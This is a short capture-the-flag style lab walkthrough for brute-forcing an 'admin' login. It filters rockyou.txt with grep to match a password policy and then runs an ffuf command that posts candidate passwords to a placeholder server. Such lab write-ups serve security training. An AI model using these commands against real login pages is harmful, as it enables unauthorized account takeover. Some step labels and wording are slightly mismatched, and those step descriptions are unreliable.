# Brute-Forcing Passwords

### What is the password of the user 'admin'?

In this assessment we already have the user 'admin' and the goal is to get the his password. To accomplish that will use the rockyou.txt wordlist, but tailor the passwords to the application requirements in order to send unnecessary requests.

Password Requirments:

* Contains at least one upper-case character
* Contains at least one lower-case character
* Contains at least one digit
* Minimum length of 10 characters

**Step 1 -** Download the SecLists wordlist:

* {% code overflow="wrap" %}
  ```
  grep '[[:upper:]]' /usr/share/wordlists/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
  ```
  {% endcode %}
* Check your rockyou.txt directory.

**Step 2 -** Intercept the application POST login parameters:

* This can be done through the Inspect Element or with Burp Suite

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 3 -** Brute-force the password:

* {% code overflow="wrap" %}
  ```
  ffuf -w ./custom_wordlist.txt -u http://SERVER_IP:SERVER_PORT/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
  ```
  {% endcode %}

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And after a few seconds we manage to get the admin passowrd!
